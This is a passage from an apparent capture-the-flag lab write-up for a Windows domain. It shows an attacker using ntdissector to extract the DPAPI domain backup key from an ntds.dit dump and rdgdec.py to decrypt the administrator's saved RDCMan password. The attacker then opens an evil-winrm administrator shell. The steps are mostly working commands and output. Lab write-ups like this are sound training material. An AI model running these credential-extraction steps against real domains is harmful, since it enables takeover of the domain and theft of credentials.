    </credentialsProfiles>
    <properties>
      <expanded>True</expanded>
      <name>jenkins</name>
    </properties>
    <server>
      <properties>
        <name>dc1.klendathu.vl</name>
      </properties>
      <logonCredentials inherit="None">
        <profileName scope="File">KLENDATHU\administrator</profileName>
      </logonCredentials>
    </server>
  </file>
  <connected />
  <favorites />
  <recentlyUsed />
</RDCMan>
```

The credentials were encrypted with DPAPI which uses password and domain backup keys. Despite password resets, there is no way to change domain backup keys, thus we can extract them from the domain backup we found in `SRV2`. 

Helpful articles:
- https://www.synacktiv.com/publications/introducing-ntdissector-a-swiss-army-knife-for-your-ntdsdit-files
- https://www.synacktiv.com/publications/windows-secrets-extraction-a-summary


First is the location of user's masterkeys. They are located it `C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>`, which we found in `Jenkins`' archive
```
└─$ ls -lha Roaming/Microsoft/Protect
total 20K
drwxrwxr-x  3 kali kali 4.0K Apr 10  2024 .
drwxrwxr-x 11 kali kali 4.0K Apr 10  2024 ..
-rw-rw-r--  1 kali kali   24 Apr 10  2024 CREDHIST
drwxrwxr-x  2 kali kali 4.0K Apr 10  2024 S-1-5-21-641890747-1618203462-755025521-1110
-rw-rw-r--  1 kali kali   76 Apr 11  2024 SYNCHIST
```
```
└─$ ls -lha Roaming/Microsoft/Protect/S-1-5-21-641890747-1618203462-755025521-1110 
total 20K
drwxrwxr-x 2 kali kali 4.0K Apr 10  2024 .
drwxrwxr-x 3 kali kali 4.0K Apr 10  2024 ..
-rw-rw-r-- 1 kali kali  740 Apr 11  2024 9b062d05-141e-4fda-9b2d-461f4693a5eb
-rw-rw-r-- 1 kali kali  908 Apr 10  2024 BK-KLENDATHU
-rw-rw-r-- 1 kali kali   24 Apr 10  2024 Preferred
```

Now by using [ntdissector](https://github.com/synacktiv/ntdissector), we can extract private master key from the domain backup
```
└─$ ntdissector -ntds ntds.dit -system SYSTEM -outputdir . -ts -f all
[2025-06-22 00:06:23] [-] Couldn't load cache file /home/kali/.ntdissector/.cache/118a48dc41fce5ffea884c0793d4ac92/__objectClassSchema.json -> [Errno 2] No such file or directory: '/home/kali/.ntdissector/.cache/118a48dc41fce5ffea884c0793d4ac92/__objectClassSchema.json'
[2025-06-22 00:06:23] [*] Building the schemas, please wait...
[2025-06-22 00:06:24] [*] PEK # 0 found and decrypted: feab48d5655b005f0fed603c166c587f
[2025-06-22 00:06:24] [*] Filtering records with this list of object classes :  ['all']
[2025-06-22 00:06:24] [*] Ignoring records marked as deleted
100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 3747/3747 [00:00<00:00, 9958.34rec./s]
[2025-06-22 00:06:24] [*] Finished, matched 3708 records out of 3747
[2025-06-22 00:06:24] [*] Processing 3708 serialization tasks
100%|████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 3708/3708 [00:08<00:00, 407.43rec./s]
```

Open `secret.json` file and search for `pvk` which is in base64
```
└─$ cat out/118a48dc41fce5ffea884c0793d4ac92/secret.json | jq .
{
  "lastSetTime": "2024-04-10T23:33:43.270441+00:00",
  "priorSetTime": "2024-04-10T23:33:43.270441+00:00",
  "dSCorePropagationData": "1601-01-01T00:00:00+00:00",
  "isCriticalSystemObject": 1,
  "showInAdvancedViewOnly": 1,
  "distinguishedName": "CN=BCKUPKEY_P Secret,CN=System,DC=KLENDATHU,DC=VL",
<SNIP>
  "currentValue": {
    "pvk": "HvG1sAAAAAABAAAAAAAAAAAAAA<REDACTED>A3OR0YcQ4JuS1vPT6wMuzV4=",                                          
<SNIP>
}
```
```
└─$ cat pvk | base64 -d > pvk.key               
```

After saving it to file, we can now use [rdgdec.py](https://github.com/tijldeneut/dpapilab-ng/blob/main/rdgdec.py) to decrypt the administrator credentials from `rdg` 
```
└─$ python3 rdgdec.py jenkins.rdg --masterkey=./Roaming/Microsoft/Protect/S-1-5-21-641890747-1618203462-755025521-1110/ --sid S-1-5-21-641890747-1618203462-755025521-1110 -k pvk.key 
[+] Profile:  KLENDATHU\administrator
    Username: administrator
    Domain:   KLENDATHU
    Password: <REDACTED>
-------------------------------------------------------------------------------
[+] Decrypted 1 out of 1 credentials
```

Now we can finally get our root flag
```
└─$ evil-winrm -i 10.10.246.197 -u administrator -p '<REDACTED>'   

                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

[https://api.vulnlab.com/api/v1/share?id=6c3a30e9-97cc-4fcb-913c-add1edb70c85](https://api.vulnlab.com/api/v1/share?id=6c3a30e9-97cc-4fcb-913c-add1edb70c85)